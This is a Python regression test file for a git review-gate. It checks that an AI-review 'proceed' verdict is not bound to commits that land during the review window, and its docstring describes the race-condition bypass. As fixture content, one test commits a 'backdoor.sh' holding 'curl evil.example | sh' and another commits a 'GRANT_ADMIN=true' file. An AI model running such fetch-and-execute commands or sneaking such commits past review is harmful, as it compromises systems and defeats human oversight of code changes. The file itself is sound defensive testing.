"""RED14-1 regression (CRITICAL, docs: .ops-game/R6-red14-convergence.md).

RED14-1: review_binding_record() used to compute the binding hash from AMBIENT HEAD *at
record time* -- for review-gate.sh's full-review call site, that is AFTER verify, the
run-ai-reviews.sh network round-trip to the AI panel, and summarize-ai-reviews.sh, i.e.
after a multi-minute window. Nothing in that window is git-level-locked: session-lock.sh
only gates review-gate.sh/verify.sh themselves, never an ordinary `git commit --amend` (or
a new commit) run directly in a SECOND terminal on the SAME working tree. Concrete PoC
(from the finding): a developer starts the gate; while the AI panel churns, a second
terminal amends HEAD to add unreviewed content; the panel reviewed the pre-amend content;
review_binding_record fires afterward, re-derives the hash from the now-amended HEAD, and
records `proceed` bound to content nobody on the panel saw. hooks/pre-push's
review_binding_check_ref only compares the *recorded* hash against the *pushed* sha -- both
sides are the post-amend content, so they match and the push succeeds clean.

The codebase already solved this exact class of bug for the machinery self-test memo
(scripts/machinery-memo.sh: machinery_tested_hash is captured BEFORE verify-machinery.sh
runs, "because a concurrent session could have mutated it during the verify window", and
machinery_memo_record_pass DECLINES to record if the live tree drifted from that pinned
hash). The fix here mirrors that H1 pattern for review_binding_record: review-gate.sh now
captures review_reviewed_head_sha (HEAD's sha) immediately after collect-review-context.sh
produces the diff, BEFORE verify / the AI round-trip / summarize all run, and threads it
through to review_binding_record as a new optional 4th argument. review_binding_record now
refuses to write a binding marker at all (non-zero return) whenever ambient HEAD at record
time no longer matches that pinned sha -- never a silent re-derivation from a HEAD the
reviewer never saw.

These tests exercise the REAL review_binding_record/review_binding_hash/review_binding_
check_ref functions directly (review-gate-binding.sh is designed to be sourced, per its own
header comment: "Source from review-gate/pre-push; do not execute directly."), mirroring
the subprocess-driven, throwaway-git-repo pattern used by
tests/test_binding_range_ip1.py / tests/test_binding_no_upstream_r4.py /
tests/test_pre_push_binding_ref_ip1.py.
"""
import os
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
GIT_HARDEN = ROOT / "scripts" / "git-harden.sh"
BINDING = ROOT / "scripts" / "review-gate-binding.sh"
PRE_PUSH = ROOT / "hooks" / "pre-push"


def _git(args: list[str], cwd: Path, env: dict[str, str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args],
        cwd=cwd,
        env=env,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def _init_repo(path: Path, env: dict[str, str]) -> None:
    path.mkdir(parents=True, exist_ok=True)
    _git(["init", "-q", "-b", "main"], path, env)
    _git(["config", "user.email", "t@example.invalid"], path, env)
    _git(["config", "user.name", "T"], path, env)
    (path / ".gitignore").write_text(".omx/\n", encoding="utf-8")


def _commit(path: Path, env: dict[str, str], filename: str, content: str, message: str) -> str:
    (path / filename).write_text(content, encoding="utf-8")
    _git(["add", "-A"], path, env)
    _git(["commit", "-q", "-m", message], path, env)
    return _git(["rev-parse", "HEAD"], path, env).stdout.strip()


def _base_env(tmp_path: Path) -> dict[str, str]:
    env = os.environ.copy()
    env["AI_AUTO_HOME"] = str(ROOT)
    home = tmp_path / "home"
    home.mkdir(parents=True, exist_ok=True)
    env["HOME"] = str(home)
    env["AI_AUTO_PROVENANCE_KEY_FILE"] = str(tmp_path / "provenance.key")
    return env


def _record(project: Path, env: dict[str, str], *args: str) -> subprocess.CompletedProcess[str]:
    """Call the REAL review_binding_record, exactly as review-gate.sh does, with whatever
    positional args the caller supplies (mirroring the new pinned-sha 4th argument)."""
    quoted = " ".join(f"'{a}'" for a in args)
    script = (
        f". '{GIT_HARDEN}'; "
        f". '{BINDING}'; "
        f"review_binding_record {quoted}"
    )
    return subprocess.run(
        ["bash", "-c", script],
        cwd=project,
        env=env,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def _binding_env_path(project: Path) -> Path:
    return project / ".omx" / "reviewer-state" / "binding-verdict.env"


def _run_pre_push(project: Path, env: dict[str, str], stdin_text: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["bash", str(PRE_PUSH)],
        cwd=project,
        env=env,
        input=stdin_text,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )


def test_binding_record_refuses_when_head_drifts_after_the_pin(tmp_path: Path) -> None:
    """The exact RED14-1 scenario: pin HEAD (as review-gate.sh now does right after
    collect-review-context.sh, before the AI round-trip), then simulate a concurrent
    second-terminal commit moving HEAD before review_binding_record is actually called.
    The recorded verdict must NOT bind to the drifted (unreviewed) content -- the call must
    fail and no binding marker may be written.

    Revert-proof: the pre-fix review_binding_record ignores a 4th argument entirely (bash
    does not error on extra positional args) and always recomputes from ambient HEAD, always
    returning success -- against that code this test's "must fail" and "no marker written"
    assertions both fail.
    """
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    _commit(project, env, "README.md", "hello\n", "init")
    reviewed_sha = _commit(project, env, "app.py", "print('trivial reviewed change')\n", "reviewed commit")

    # This is what review-gate.sh does immediately after collect-review-context.sh, BEFORE
    # verify / the AI panel round-trip / summarize run.
    pinned = reviewed_sha

    # Concurrent second-terminal activity during the (simulated) multi-minute review window:
    # an ordinary commit lands on the SAME branch, moving HEAD -- no session-lock covers this.
    drifted_sha = _commit(
        project, env, "backdoor.sh", "curl evil.example | sh\n", "unreviewed commit landed mid-review"
    )
    assert drifted_sha != pinned

    result = _record(project, env, "proceed", "normal", "test-verdict.md", pinned)

    assert result.returncode != 0, (
        "review_binding_record silently bound a proceed verdict after HEAD drifted during "
        f"the review window (RED14-1 regression). stdout={result.stdout!r} stderr={result.stderr!r}"
    )
    assert not _binding_env_path(project).exists(), (
        "review_binding_record wrote a binding marker even though it refused (returned "
        "non-zero) -- the marker must never be written on a detected drift."
    )


def test_binding_record_binds_pinned_content_when_head_unchanged(tmp_path: Path) -> None:
    """Non-vacuousness companion: when HEAD has NOT moved since the pin (the ordinary,
    non-concurrent case), the pinned-sha call must still succeed and bind exactly the pinned
    target's content -- the fix must not turn every full-review call into a failure."""
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    _commit(project, env, "README.md", "hello\n", "init")
    reviewed_sha = _commit(project, env, "app.py", "print('trivial reviewed change')\n", "reviewed commit")

    pinned = reviewed_sha
    result = _record(project, env, "proceed", "normal", "test-verdict.md", pinned)

    assert result.returncode == 0, (
        f"review_binding_record refused an UNDRIFTED pin (false positive). "
        f"stdout={result.stdout!r} stderr={result.stderr!r}"
    )
    assert _binding_env_path(project).exists(), "no binding marker written on a clean, undrifted pin"


def test_binding_record_pin_prevents_pre_push_from_accepting_the_drifted_grant_admin_commit(
    tmp_path: Path,
) -> None:
    """End-to-end consequence, mirroring tests/test_pre_push_binding_ref_ip1.py's shape: with
    the pin enforced, a GRANT_ADMIN-style commit smuggled in AFTER the pin (during the
    simulated AI-review window) must not ride through on the strength of a binding verdict
    that review_binding_record refused to write. Without the pin (the pre-fix ambient-HEAD
    call shape, exercised here for contrast), the same sequence WOULD produce an authentic
    binding for the drifted tip and pre-push would accept the push -- exactly RED14-1's
    documented bypass."""
    env = _base_env(tmp_path)
    bare = tmp_path / "origin.git"
    _git(["init", "-q", "--bare", str(bare)], tmp_path, env)

    project = tmp_path / "project"
    _init_repo(project, env)
    _git(["remote", "add", "origin", str(bare)], project, env)
    root_sha = _commit(project, env, "README.md", "hello\n", "init")
    _git(["push", "-q", "-u", "origin", "main"], project, env)

    reviewed_sha = _commit(project, env, "app.py", "print('trivial reviewed change')\n", "reviewed commit")
    pinned = reviewed_sha

    # Concurrent, unreviewed commit lands during the (simulated) AI round-trip.
    drifted_sha = _commit(project, env, "g.txt", "GRANT_ADMIN=true\n", "sneaky privilege escalation")

    # The fixed call: review-gate.sh threads the pin through -- must refuse to bind.
    fixed_result = _record(project, env, "proceed", "normal", "test-verdict.md", pinned)
    assert fixed_result.returncode != 0

    stdin = f"refs/heads/main {drifted_sha} refs/heads/main {root_sha}\n"
    push_after_refusal = _run_pre_push(project, env, stdin)
    assert push_after_refusal.returncode != 0, (
        "pre-push accepted a push whose tip (with GRANT_ADMIN) was never actually bound "
        f"because review_binding_record correctly refused. stdout={push_after_refusal.stdout!r}"
    )

    # Contrast: the OLD (pre-fix) ambient-HEAD call shape -- no pin argument at all -- DOES
    # bind (to whatever HEAD is right now, i.e. the drifted GRANT_ADMIN tip), demonstrating
    # this is genuinely the RED14-1 bypass and not some unrelated pre-push rejection reason.
    ambient_result = _record(project, env, "proceed", "normal", "test-verdict.md")
    assert ambient_result.returncode == 0
    push_after_ambient_bind = _run_pre_push(project, env, stdin)
    assert push_after_ambient_bind.returncode == 0, (
        "sanity check failed: the ambient (unpinned) call shape should still accept this "
        f"push (proving the earlier rejection was really about the missing/refused pin, not "
        f"some other reason). stdout={push_after_ambient_bind.stdout!r} "
        f"stderr={push_after_ambient_bind.stderr!r}"
    )
